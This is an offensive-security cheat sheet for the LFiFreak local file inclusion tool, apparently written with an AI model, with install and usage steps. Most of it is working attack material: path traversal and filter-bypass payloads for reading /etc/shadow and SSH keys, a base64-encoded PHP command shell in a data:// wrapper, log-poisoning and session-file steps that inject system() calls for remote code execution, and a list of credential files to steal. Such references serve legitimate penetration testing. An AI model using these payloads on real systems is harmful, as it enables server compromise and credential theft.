# LFiFreak

**Tags:** `#lfi` `#localfileinclusion` `#rce` `#webappsec` `#web`

Automated LFI (Local File Inclusion) exploitation tool with bind/reverse shell capability. Tests LFI parameters using multiple encoding and bypass techniques, attempts to escalate LFI to RCE via log poisoning and PHP wrappers, and provides shell options if exploitation succeeds.

**Source:** https://github.com/OsandaMalith/LFiFreak
**Install:**
```bash
git clone https://github.com/OsandaMalith/LFiFreak.git
cd LFiFreak
pip install -r requirements.txt
python LFiFreak.py
```

> [!note]
> LFiFreak, LFI Suite, and liffy all do similar things. LFiFreak is notable for its bind/reverse shell integration. For most LFI work, manual testing with Burp + the PHP wrapper payloads is more reliable and controlled. Use automated tools as a first pass, then go manual.

---

## Basic Usage

```bash
# Launch interactive menu
python LFiFreak.py

# Common prompts:
# Enter URL with LFI parameter: http://target.com/page.php?file=FUZZ
# Select technique (encoding, wrapper, log poison)
# Select shell type if escalation succeeds
```

---

## LFI Payloads (Manual Reference)

```bash
# Basic traversal
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts

# Filter bypass
....//....//....//etc/passwd          # double slash
..%2f..%2f..%2fetc%2fpasswd           # URL encoded slash
..%252f..%252fetc%252fpasswd          # double URL encoded
....\/....\/etc/passwd                # backslash
%2e%2e%2f%2e%2e%2fetc/passwd         # URL encoded dots

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00

# PHP wrappers
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://input                           # POST body as PHP (needs allow_url_include)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# expect wrapper (RCE — rare)
expect://id
```

---

## LFI → RCE via Log Poisoning

```bash
# 1. Inject PHP into User-Agent
curl -s http://target.com/ -A "<?php system(\$_GET['cmd']); ?>"

# 2. Include the access log via LFI
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id

# Common log paths to try
../../../../var/log/apache2/access.log
../../../../var/log/apache2/error.log
../../../../var/log/nginx/access.log
../../../../var/log/nginx/error.log
../../../../proc/self/fd/2             # stderr fd
../../../../var/log/auth.log           # SSH log poison (inject via username)
../../../../var/mail/www-data          # sendmail log
```

---

## LFI → RCE via PHP Session

```bash
# 1. Find your session ID from cookie: PHPSESSID=abc123
# 2. Inject PHP into a parameter that gets stored in session
http://target.com/page.php?username=<?php system($_GET['cmd']); ?>

# 3. Include the session file
http://target.com/page.php?file=../../../../tmp/sess_abc123&cmd=id

# Session file paths
../../../../tmp/sess_PHPSESSID
../../../../var/lib/php/sessions/sess_PHPSESSID
../../../../var/lib/php5/sess_PHPSESSID
```

---

## Useful Files to Read via LFI

```bash
# Linux
/etc/passwd
/etc/shadow          # needs root
/etc/hosts
/proc/self/environ   # environment variables (may have creds)
/proc/self/cmdline   # current process command line
/proc/net/tcp        # open connections (hex)
/home/user/.ssh/id_rsa
/home/user/.bash_history
/var/www/html/config.php
/var/www/html/.env

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Users\user\Desktop\user.txt
C:\inetpub\wwwroot\web.config
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
